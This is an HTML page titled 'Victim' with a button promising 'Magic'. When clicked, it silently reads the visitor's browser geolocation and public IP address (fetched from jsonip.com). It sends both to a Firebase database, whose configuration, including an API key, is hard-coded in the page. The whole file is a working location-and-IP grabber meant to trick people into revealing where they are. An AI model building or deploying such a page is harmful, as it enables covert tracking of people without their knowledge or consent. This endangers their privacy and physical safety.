<!DOCTYPE html>
<html>
<head>
  <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <title>Victim</title>
</head>
<body>
    <div class="container">
      <h1 class="mt-50">Hello Everyone</h1>
      <button onclick="getLocation()" class="btn btn-danger">Click and you see a Magic</button>
    </div>
    <input type="hidden" id="latitude">
    <input type="hidden" id="longitude">
    <input type="hidden" id="ipinput">
    <!--Firebase Libraries-->
    <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase-analytics.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase-firestore.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.7.1/firebase-database.js"></script>
    <!-- Main Script Start -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.js"></script>
    <script type="text/javascript">
        var ipA ;
        var getIPAddress = function() {
        $.getJSON("https://jsonip.com?callback=?", function(data) {
            // document.getElementById('ipinput').value=data.ip;
            ipA = data.ip;
            // return data.ip ;
        });
    };
    </script>
    <script id="MainScript">
      var firebaseConfig = {
        apiKey: "AIzaSyBykbWQjEL9hLvKcIpuMzLHqtsPG1GpTg0",
        authDomain: "login-tutorial-f50b4.firebaseapp.com",
        databaseURL: "https://login-tutorial-f50b4-default-rtdb.firebaseio.com",
        projectId: "login-tutorial-f50b4",
        storageBucket: "login-tutorial-f50b4.appspot.com",
        messagingSenderId: "540835602609",
        appId: "1:540835602609:web:b5ec11cbc6d9ae29cd0290",
        measurementId: "G-NPYF6NJ5LF",
      }
      firebase.initializeApp(firebaseConfig);
      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition);
        } else { 
          x.innerHTML = "Geolocation is not supported by this browser.";
        }
      }
      getIPAddress();
      function showPosition(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
        document.getElementById('longitude').value=longitude;
        document.getElementById('latitude').value=latitude;
        // console.log(longitude);
        // console.log(latitude);
        i = Math.floor(Math.random() * 100000 );
        // var ipAddress = document.getElementById('ipinput').value;
        // console.log(ipAddress);
        firebase.database().ref('student/'+i).set({
          Longitude : longitude,
          Latitude : latitude,
          IPAddress : ipA
        })
        
      }
    </script>


    <!-- <script>
      getLocation();
    </script> -->
</body>
</html>
